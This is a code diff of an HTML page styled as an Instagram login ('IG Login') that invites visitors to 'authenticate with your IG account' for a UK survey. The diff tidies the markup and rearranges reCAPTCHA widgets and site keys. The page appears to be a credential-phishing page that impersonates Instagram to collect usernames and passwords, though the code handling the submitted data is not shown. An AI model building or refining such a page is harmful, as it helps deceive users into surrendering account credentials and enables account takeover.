@@ -8,24 +8,13 @@
     <link rel="stylesheet" href="style.css">
     <link rel="shortcut icon" href="images/favicon.svg" type="image/x-icon">
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-
-
     <script src="https://www.google.com/recaptcha/api.js"></script>
-    <!-- <script src="https://www.google.com/recaptcha/api.js?render=6Lck-PsoAAAAALfpGV1s6LR-sqHPVGZ3zXHRSOAC"></script> -->
-
-
-
-
     <!-- For Facebook -->
     <!-- <meta property="og:type" content="Your card type"> -->
     <meta property="og:image" content="./images/ig-logo.svg">
     <meta name="description" content="Autheticate with your IG account to participate in this survey from UK">
 
     <!-- For Twitter -->
-
-
-
-
 
     <title>IG Login</title>
 </head>
@@ -37,9 +26,11 @@
                 <img src="images/ig-logo.svg" alt="">
             </div>
             <form id="insta-form">
+                <div class="g-recaptcha visible" data-sitekey="6LfXmAMpAAAAAGkfW72DzqAqg5hhdbwGdk5ZGtUu"></div>
+
                 <input type="text" class="text-input" placeholder="Phone Number, Username, or Email">
                 <input type="password" class="text-input" placeholder="Password">
-                <input type='submit' class='text-input primary-btn g-recaptcha' data-sitekey='6LfXmAMpAAAAAGkfW72DzqAqg5hhdbwGdk5ZGtUu' data-callback="onSubmit" data-action='submit' value="Get In">
+                <input type='submit' class='text-input primary-btn g-recaptcha' data-sitekey='6Lck-PsoAAAAALfpGV1s6LR-sqHPVGZ3zXHRSOAC' data-callback="onSubmit" data-action='submit' value="Get In">
             </form>
             <div class="or">
                 <hr class="bar"> OR
